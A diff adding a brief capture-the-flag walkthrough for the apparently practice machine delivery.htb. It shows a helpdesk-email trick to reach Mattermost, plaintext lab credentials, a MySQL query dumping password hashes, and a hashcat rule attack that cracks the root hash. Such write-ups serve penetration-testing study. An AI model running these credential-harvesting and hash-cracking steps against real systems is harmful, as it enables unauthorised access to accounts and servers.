@@ -1,0 +1,45 @@
+[*] Domain: delivery.htb
+
+> For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.
+
+[*] Let's create a ticket at http://helpdesk.delivery.htb/
+
+> If you want to add more information to your ticket, just email 8973539@delivery.htb.
+
+[!] @delivery.htb email address -> 8973539@delivery.htb
+
+[!!] "If you want to add more information to your ticket, just email <...>"
+
+[!!!] At the moment you create a MM account with this address, the confirmation email will update the ticket description.
+
+[+] We are in. Let's see, what's there...
+
+> @developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail! 
+> Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
+> PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
+
+[+] Okies. Got user.txt. Let's hunt the hash down.
+
+[*] MM config is at /opt/mattermost/config/config.json
+
+[+] SqlSettings: <...> mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost
+
+mysql -u mmuser -pCrack_The_MM_Admin_PW -h localhost mattermost
+
+MariaDB [mattermost]> SHOW TABLES;
+
+<...>
+
+MariaDB [mattermost]> select Username, Password from Users;
+
+<...>
+root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+<...>
+
+[+] Got the root hash. Let's use https://raw.githubusercontent.com/incredibleindishell/hash-cracker-ICA/master/top_3000.rule
+
+hashcat -a 0 -m 3200 loot/root.hash loot/wordlist.txt -r exploit/top_3000.rule -o loot/cracked.txt
+
+Session..........: hashcatStatus...........: CrackedHash.Name........: bcrypt $2*$, Blowfish (Unix)Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjOTime.Started.....: Sun Jan 10 23:43:34 2021 (25 secs)Time.Estimated...: Sun Jan 10 23:43:59 2021 (0 secs)Guess.Base.......: File (loot/wordlist.txt)Guess.Mod........: Rules (exploit/top_3000.rule)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:        4 H/s (1.81ms) @ Accel:4 Loops:8 Thr:1 Vec:4Recovered........: 1/1 (100.00%) DigestsProgress.........: 91/3000 (3.03%)Rejected.........: 0/91 (0.00%)Restore.Point....: 0/1 (0.00%)Restore.Sub.#1...: Salt:0 Amplifier:90-91 Iteration:1016-1024Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21
+
+[+] Got root.txt! (su root)
